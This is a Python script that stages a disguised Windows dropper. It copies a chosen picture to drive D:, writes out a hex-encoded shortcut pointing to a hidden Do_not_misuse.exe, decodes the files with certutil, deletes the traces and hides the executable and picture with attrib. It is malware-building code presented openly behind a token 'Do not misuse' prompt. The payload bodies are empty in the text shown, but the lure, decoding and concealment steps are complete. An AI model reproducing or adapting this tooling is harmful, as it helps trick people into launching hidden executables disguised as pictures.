import sys
import os
import tkinter as tk
import tkinter.messagebox as messagebox
import tkinter.filedialog as filedialog
import shutil
import subprocess

tk.Tk().withdraw()
TorF = messagebox.askokcancel('<Confirmation>', 'Do not misuse this code.')
if TorF == False:
    sys.exit()

tk.Tk().withdraw()
messagebox.showinfo('<Instruction>', 'On the next page, please select the picture(.jpg, .png or others).')

tk.Tk().withdraw()
pic_path = filedialog.askopenfilename() #select pic

shutil.copy(f'{pic_path}', 'D:') #make copy of the pic on D:
basename = os.path.basename(pic_path) #put file name of pic into {basename}

f = open("D:\\pic_name.txt", 'w')
f.write(f"{basename}") #write down the file name of the pic for Do_not_misuse.exe to notice the file name that it have to pick up
f.close

f = open("D:\\Do_not_misuse_E.txt", 'w') #generate the binary text of Do_not_misuse.exe
f.write('')
f.close()

f = open("D:\\Do_not_misuse_L.txt", 'w') #generate the binary text of Do_not_misuse.lnk
f.write('4c0000000114020000000000c000000000000046db00080020000000c02690321609db0100584699a40adb01009b02ee0b09db01b8996d006d00000007000000000000000000000000000000cb0055001f002f0010b7a6f519002f443a5c00000000000000000000000000000000000000000000000000000000000000000000000000741a595e96dfd3488d671733bcee28ba772cfbf52f0e164aa3813e560c68bc837400320000000000000000002000446f5f6e6f745f6d69737573652e65786500540009000400efbe00000000000000002e000000000000000000000000000000000000000000000000000000000044006f005f006e006f0074005f006d00690073007500730065002e00650078006500000020000000490000001c000000010000001c0000003300000000000000480000001700000002000000887019f4100000004b494f58494100443a5c446f5f6e6f745f6d69737573652e657865000013002e005c0044006f005f006e006f0074005f006d00690073007500730065002e00650078006500030044003a005c0021002500530079007300740065006d0052006f006f00740025005c00530079007300740065006d00330032005c005300480045004c004c00330032002e0064006c006c0000000000')
f.close()

f = open("D:\\After_use.txt", 'w') #generate the binary text of After_use.exe
f.write('')
f.close()

subprocess.run('certutil -f -decodehex D:\\Do_not_misuse_E.txt D:\\Do_not_misuse.exe 12 ' #decode Do_not_misuse.exe
                +'&& certutil -f -decodehex D:\\Do_not_misuse_L.txt D:\\Do_not_misuse.lnk 12 ' #decode Do_not_misuse.exe
                +'&& certutil -f -decodehex D:\\After_use.txt D:\\After_use.exe 12 ' #decode After_use.exe
                +'&& del D:\\Do_not_misuse_E.txt ' #delete binary text of Do_not_misuse.exe
                +'&& del D:\\Do_not_misuse_L.txt ' #delete binary text of Do_not_misuse.lnk
                +'&& del D:\\After_use.txt ' #delete binary text of After_use.exe
                +'&& attrib +r +h d:\\Do_not_misuse.exe' #hide Do_not_misuse.exe
                +f'&& attrib +r +h d:\\{basename}' #hide the pic
                +'&& attrib +r +h d:\\pic_name.txt', shell=True) #hide note text of the file name of the pic that is for Do_not_misuse.exe